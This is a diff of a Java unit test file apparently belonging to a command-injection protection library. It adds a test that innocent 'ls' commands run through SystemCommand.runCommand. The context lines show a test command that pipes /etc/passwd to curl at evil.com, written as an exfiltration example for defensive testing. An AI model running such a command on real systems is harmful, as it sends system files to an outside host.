@@ -44,6 +44,16 @@ final class SystemCommandTest {
   }
 
   @Test
+  void it_allows_innocent_commands() throws IOException {
+    SystemCommand.runCommand(rt, "ls");
+    SystemCommand.runCommand(rt, new String[] {"ls", "-al"});
+    SystemCommand.runCommand(rt, new String[] {"ls", "-al"}, new String[] {});
+    SystemCommand.runCommand(rt, "ls", new String[] {});
+    SystemCommand.runCommand(rt, "ls", new String[] {}, new File("target/"));
+    SystemCommand.runCommand(rt, new String[] {"ls"}, new String[] {}, new File("target/"));
+  }
+
+  @Test
   void it_allows_chains_if_turned_off() throws IOException {
     SystemCommand.runCommand(
         rt, "/bin/sh -c \"cat /etc/passwd | curl http://evil.com/\"", Collections.emptySet());
